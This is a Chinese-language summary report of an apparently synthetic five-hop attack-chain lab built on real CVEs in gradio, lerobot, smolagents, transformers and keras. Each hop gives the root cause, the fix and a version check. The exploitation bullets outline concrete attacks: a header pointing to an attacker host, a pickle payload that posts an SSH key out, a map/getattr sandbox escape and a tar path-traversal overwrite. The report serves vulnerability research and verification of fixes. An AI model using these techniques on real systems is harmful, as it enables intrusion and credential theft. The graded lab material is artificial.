# CHAIN-5HOP-001 诊断报告 — 五个真实 CVE 的漏洞定位、利用、修复与双版本验证

日期:2026-11-20。本文是验收清单第 6 项(诊断报告)的汇总层;每跳的完整机制考古、运行输出与复跑命令在各跳 `HOP*_REPORT.md`(细节以跳级报告为准)。闸门总况:G1 10/10、G2 全链通、G3 5/5、G4 6/6、G5 7/7(2026-11-20)。

## 总表

| 跳 | CVE | 软件(受影响→修复) | 漏洞类 | 位置(官方 wheel 内) | 根因一句话 |
|---|---|---|---|---|---|
| 1 | CVE-2024-2206 | gradio 4.17.0 → 4.18.0 | SSRF/config 污染 | `gradio/routes.py` / 与 /config | 攻击者可控的 `X-Direct-Url` 头写入服务端共享 config(`root`),无 deepcopy、无 set-once → 服务端消费者用被污染 root 代访内网并携带内网令牌 |
| 2 | CVE-2026-25874 | lerobot 0.5.1 → 0.7.0 | pickle 反序列化 RCE | `lerobot/async_inference/policy_server.py:125` | 未认证 gRPC handler `pickle.loads(request.data)` 直接反序列化请求体;isinstance 校验在 RCE 之后,形同虚设 |
| 3 | CVE-2025-5120 | smolagents 1.16.0 → 1.17.0 | 沙箱逃逸 | `smolagents/local_python_executor.py` | safer_eval 只检查流经 AST 节点的值;static tools(`getattr`/`map`)的**调用结果不检查** → map/getattr 链原生调用绕过全部检查,`os.posix_spawn` RCE |
| 4 | CVE-2024-11392 | transformers 4.47.1 → 4.48.0 | torch.load 反序列化 RCE | `transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py:240` | conversion 脚本 `torch.load(checkpoint_path)` 无 `weights_only`,用户上传文件直接反序列化 |
| 5 | CVE-2026-11816 | keras 3.13.2 → 3.14.0 | 路径穿越任意写 | `keras/src/utils/file_utils.py` `filter_safe_tarinfos()` | tar 安全过滤以 **CWD** 为界(`resolve_path(".")`)而非解压目标目录;CWD=/ 时任何绝对路径 member 都通过 `startswith("/")` → 任意文件写 |

## 每跳:怎么利用 / 怎么修 / 修复版验证

### 跳 1 — gradio SSRF
- **利用**:无凭据请求带 `X-Direct-Url: http://attacker:8000` → `/config` 的 `config["root"]` 被持久污染(最后写入者获胜)→ 立即触发面板的 `/asset-feed-proxy` → 服务端带 `X-Internal-Token` fetch 攻击者 URL → 内网令牌 + 模型服务器地址外泄。注意 4.17 的 `/proxy` 路由不可直接利用(`blocks.proxy_urls` 仅 `gr.load()` 填充);污染必须赶在下一次干净 `/config` 重置 root 之前消费。
- **修复**(commit `49d9c485`,4.18.0):移除 `X-Direct-Url` 信任(root 从 `request.url` 推导)+ `config["root"]` set-once + `add_root_url()` 每请求读取。
- **双版本验证**:4.17.0 exit 0(loot: 令牌+模型服务器地址)/ 4.18.0 exit 2(header 被无视,监听器零请求)。→ `hop1_gradio/report/HOP1_REPORT.md`

### 跳 2 — lerobot pickle RCE
- **利用**:gRPC(无 TLS、无认证)`SendPolicyInstructions` 发恶意 pickle,`__reduce__` 返回 `(exec, cmd)`;handler 随后抛 TypeError 但 **RCE 已发生**——payload 在 unpickle 内联执行,读 `/loot/id_rsa` POST 给攻击者。
- **修复考证更正**:PyPI 无 0.5.2;0.6.0/0.6.1 仍含同一 `pickle.loads`;**0.7.0** 整体移除 `async_inference` gRPC 服务,替换为 zenoh+msgpack(入站载荷 msgpack 解析,失败即 drop),全树无服务端 `pickle.loads` 输入路径。
- **双版本验证**:0.5.1 exit 0(loot: SSH 私钥)/ 0.7.0 exit 2 双通道(gRPC 连接拒绝 + zenoh 泛洪 5 类载荷全被 msgpack 拒绝,零回连)。→ `hop2_lerobot/report/HOP2_REPORT.md`

### 跳 3 — smolagents 沙箱逃逸
- **利用**:授权 `import warnings` → `list(map(getattr, [warnings], ["sys"]))` 等一系列 map/getattr 原生调用:每个中间值包在 list 里、无任何 AST 节点持有 ModuleType 或黑名单函数 → 全部检查不触发 → `os.posix_spawn`(不在 DANGEROUS_FUNCTIONS)起 shell,读 DB 凭据外泄。
- **修复**(commit `33a942e6`,1.17.0,PR #1375):新增 `check_safer_result`/`safer_func`,每个 static tool **调用结果**也过检查。
- **双版本验证**:1.16.0 exit 0(逃逸+loot: db-user/db-pass/db-apikey)/ 1.17.0 exit 2(PoC 第一行即 `Forbidden access to module: sys`)。1.16 的直接路径(`warnings.sys`、`sys.modules["os"]`)实测均被拦——逃逸唯一缺口就是调用结果不检查。→ `hop3_smolagents/report/HOP3_REPORT.md`

### 跳 4 — transformers torch.load RCE(复用已验证积木 CVE-2024-11392)
- **利用**:上传含恶意 `.pt` 的 zip 到 conversion endpoint → `convert_mobilevitv2_checkpoint` 内 `torch.load` 反序列化 → `__reduce__` exec 读 `/etc/run-secrets/keras_session` 外泄。500 报错发生在 RCE 之后,不构成防御。torch 依赖钉 `>=2.0,<2.6`(2.6 起默认 `weights_only=True` 会掩盖漏洞路径)。
- **修复**(4.48.0):conversion 脚本整体从 release wheel 移除 → 同一请求 HTTP 410。
- **双版本验证**:4.47.1 exit 0(loot: keras 会话凭据)/ 4.48.0 exit 2(410,监听器零回连)。→ `hop4_transformers/report/HOP4_REPORT.md`

### 跳 5 — keras 路径穿越任意写
- **利用**:上传 tar,member 用绝对路径 `/etc/run-secrets/final_flag` → `filter_safe_tarinfos` 以 CWD(=/)为界,`startswith("/")` 恒真 → 绝对路径 member 放行 → 覆盖目标文件。服务 `files` 列表只显示解压目录内的相对 member,绝对 member 落在目录外——正是穿越写的直接证据。
- **修复**(3.14.0):base_dir 改为显式传入的解压目标目录,绝对路径 member resolve 后落在目录外 → 被跳过。
- **双版本验证**:3.13.2 exit 0(marker 写入 + flag 覆盖)/ 3.14.0 exit 2(member 被跳过,404)。注意 `extract_archive` 真实 import 路径为 `keras.src.utils.file_utils`(两版本一致)。→ `hop5_keras/report/HOP5_REPORT.md`

## 跨跳共性发现(方法论层)

1. **校验在危险操作之后 = 不构成防御**:hop2 的 isinstance、hop4 的 conversion 后续报错,都是 RCE 已发生后 handler 才失败——loot 已经外泄。判分以 loot 字节比对为准,不看服务返回码。
2. **两个反序列化跳的修复都不是"加过滤"而是"移除攻击面"**:hop4 移除整个 conversion 脚本、hop2 移除整个 gRPC 服务。加白名单/加校验的同族 CVE(11393/11394 家族)修复方式相同——上游对 ML 生态反序列化的共识就是砍面。
3. **时代依赖钉版本是必要条件**:torch 2.6+ 默认 weights_only 会掩盖 hop4;keras 跳的触发依赖 CWD=/ 的部署形态;gradio 跳依赖 4.17 的"最后写入者获胜"窗口。每跳的环境都把依赖钉在与 CVE 年代一致的版本。
4. **每跳 loot 都是下一跳唯一门票**(G4 凭据门 6/6 + G3 断链 5/5):令牌/SSH key/API key/会话由 build 时随机生成,只存在于受害机文件与验证门两处——断任一跳,整链不可达终点。

## 边界声明(诚实口径)

- 五跳的**部署场景**(内网演示面板、模型转换服务、keras 预处理服务等)均为合成部署场景;漏洞原语 100% 来自官方 wheel。
- G2/G4 验证的是逻辑凭据门;物理网络隔离级验证(attacker 仅 net0)已在 G3_G4_REPORT 边界声明中标注为未做。
- 对外表述为"以真实 CVE 为种子合成的攻击链",不声称"发现新真实攻击"。
